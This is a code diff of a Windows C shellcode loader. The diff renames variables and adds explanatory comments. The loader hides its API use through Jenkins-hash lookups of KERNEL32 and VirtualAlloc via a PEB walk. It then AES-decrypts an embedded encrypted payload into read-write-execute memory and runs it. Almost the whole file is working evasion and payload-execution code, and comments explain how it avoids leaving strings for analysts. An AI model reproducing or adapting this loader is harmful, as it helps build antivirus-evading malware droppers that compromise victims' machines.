@@ -1,3 +1,6 @@
+/* Dynamically loading functions using precomputed hash values to obfuscate what 
+*/
+
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -7,28 +10,30 @@
 
 #define AES256 1
 
+// The hashed values of strings "KERNEL32.DLL" and "VirtualAlloc"
 #define KERNEL32DLL_HASH 0x367DC15A
 #define VirtualAlloc_HASH 0xF625556A
 
+// Implementation of Jenkins one at a time hashing function
 #define INITIAL_SEED 7
-UINT32 HASHA(_In_ PCHAR String)
+UINT32 HASHA(_In_ PCHAR string)
 {
-	SIZE_T Index = 0;
-	UINT32 Hash = 0;
-	SIZE_T Length = lstrlenA(String);
+	SIZE_T index = 0;
+	UINT32 hash = 0;
+	SIZE_T length = lstrlenA(string);
 
-	while (Index != Length)
+	while (index != length)
 	{
-		Hash += String[Index++];
-		Hash += Hash << INITIAL_SEED;
-		Hash ^= Hash >> 6;
+		hash += string[index++];
+		hash += hash << INITIAL_SEED;
+		hash ^= hash >> 6;
 	}
 
-	Hash += Hash << 3;
-	Hash ^= Hash >> 11;
-	Hash += Hash << 15;
+	hash += hash << 3;
+	hash ^= hash >> 11;
+	hash += hash << 15;
 
-	return Hash;
+	return hash;
 }
 
 
@@ -71,77 +76,77 @@ BYTE encrypted_payload[] = {
 0x09,0xcb,0xd7,0xaf,0x2f,0xc2,0x16,0x16,0x28,0xf5,0x41,0xae,0xb5,0xd5,0x62,0x59,
 };
 
-HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
+// Retrieves a module handle using the hash of the uppercase module name. This 
+// prevents the need to keep a string of that module in the program.
+HMODULE get_module_handle_hash(DWORD hashed_name) {
 
-	if (dwModuleNameHash == NULL)
+	if (hashed_name == NULL)
 		return NULL;
 	
-	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
+	PPEB peb = (PEB*)(__readgsqword(0x60));
 
-	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
-	PLDR_DATA_TABLE_ENTRY	pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
+	PPEB_LDR_DATA ldr  = (PPEB_LDR_DATA)(peb->Ldr);
+	PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(ldr->InMemoryOrderModuleList.Flink);
 
-	while (pDte) {
+	while (dte) {
 
-		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
+		if (dte->FullDllName.Length != NULL && dte->FullDllName.Length < MAX_PATH) {
 			
-			// Converting `FullDllName.Buffer` to upper case string 
-			CHAR UpperCaseDllName[MAX_PATH];
+			CHAR upper_dll_name[MAX_PATH];
 
 			DWORD i = 0;
-			while (pDte->FullDllName.Buffer[i]) {
-				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
+			while (dte->FullDllName.Buffer[i]) {
+				upper_dll_name[i] = (CHAR)toupper(dte->FullDllName.Buffer[i]);
 				i++;
 			}
-			UpperCaseDllName[i] = '\0';
+			upper_dll_name[i] = '\0';
 
-			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
-			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
-				return pDte->Reserved2[0];
+			if (HASHA(upper_dll_name) == hashed_name)
+				return dte->Reserved2[0];
 			
 		}
 		else {
 			break;
 		}
 
-		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
+		dte = *(PLDR_DATA_TABLE_ENTRY*)(dte);
 	}
 
 	return NULL;
 }
 
-FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
+// Retrieves a module handle using the hash of the function name. This 
+// prevents the need to keep a string of that function in the program.
+FARPROC get_proc_address_hash(HMODULE module, DWORD hashed_name) {
 
-	if (hModule == NULL || dwApiNameHash == NULL)
+	if (module == NULL || hashed_name == NULL)
 		return NULL;
 
-	PBYTE pBase = (PBYTE)hModule;
+	PBYTE base = (PBYTE)module;
 
-	PIMAGE_DOS_HEADER         pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
-	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)base;
+	if (image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
 		return NULL;
 
-	PIMAGE_NT_HEADERS         pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
-	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+	PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(base + image_dos_header->e_lfanew);
+	if (image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
 		return NULL;
 
-	IMAGE_OPTIONAL_HEADER     ImgOptHdr = pImgNtHdrs->OptionalHeader;
+	IMAGE_OPTIONAL_HEADER image_opt_header = image_nt_headers->OptionalHeader;
 
-	PIMAGE_EXPORT_DIRECTORY   pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PIMAGE_EXPORT_DIRECTORY image_exp_dir = (PIMAGE_EXPORT_DIRECTORY)(base + image_opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
 
-	PDWORD  FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
-	PDWORD  FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
-	PWORD   FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+	PDWORD  function_names = (PDWORD)(base + image_exp_dir->AddressOfNames);
+	PDWORD  function_addresses = (PDWORD)(base + image_exp_dir->AddressOfFunctions);
+	PWORD   function_ordinals = (PWORD)(base + image_exp_dir->AddressOfNameOrdinals);
 
-	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
-		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
-		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+	for (DWORD i = 0; i < image_exp_dir->NumberOfFunctions; i++) {
+		CHAR* function_name = (CHAR*)(base + function_names[i]);
+		PVOID func_address = (PVOID)(base + function_addresses[function_ordinals[i]]);
 
-		// Hashing every function name pFunctionName
-		// If both hashes are equal then we found the function we want 
-		if (dwApiNameHash == HASHA(pFunctionName)) {
-			return pFunctionAddress;
+		if (hashed_name == HASHA(function_name)) {
+			return func_address;
 		}
 	}
 
@@ -151,9 +156,12 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 int main() {
     SIZE_T len = sizeof(encrypted_payload);
 
-    struct AES_ctx ctx;
+	// Initialize the context (ctx) for following AES operations
+	struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
 
+	// Definition of function pointer for VirtualAlloc. We will use this to 
+	// typecast the function pointer returned by our get_proc_address_hash function
 	typedef LPVOID(WINAPI* fnVirtualAlloc) (
 		LPVOID lpAddress,
 		SIZE_T dwSize,
@@ -161,22 +169,28 @@ int main() {
 		DWORD flProtect
 	);
 
-	HMODULE hKernel32Module = GetModuleHandleH(KERNEL32DLL_HASH);
-	fnVirtualAlloc pVirtualAlloc = GetProcAddressH(hKernel32Module, VirtualAlloc_HASH);
+	// Retrieve the proc address of VirtualAlloc in kernel32.dll. 
+	// We did not have to load kernel32.dll, since the PE loads it at launch anyway
+	HMODULE hKernel32Module = get_module_handle_hash(KERNEL32DLL_HASH);
+	fnVirtualAlloc pVirtualAlloc = get_proc_address_hash(hKernel32Module, VirtualAlloc_HASH);
 
+	// Allocate memory that has read, write, and execute permission.
     void* executable_memory = pVirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!executable_memory) {
         printf("VirtualAlloc failed: %d\n", GetLastError());
         return -1;
     }
 
+	// Copy the encrypted payload into the allocated memory
     memcpy(executable_memory, encrypted_payload, len);
 
-    AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
+	// Decrypt the payload in place using AES
+	AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
 
-    ((void(*)()) executable_memory)();
+	// Run the payload using pointer magic
+	((void(*)()) executable_memory)();
 
     getchar();
-	//printf("KERNEL32.DLL hash: 0x%08X\n", HASHA("KERNEL32.DLL"));
-	//printf("VirtualAlloc hash: 0x%08X\n", HASHA("VirtualAlloc"));
+	//printf("KERNEL32.DLL hash: 0x%08x\n", HASHA("KERNEL32.DLL"));
+	//printf("VirtualAlloc hash: 0x%08x\n", HASHA("VirtualAlloc"));
 }
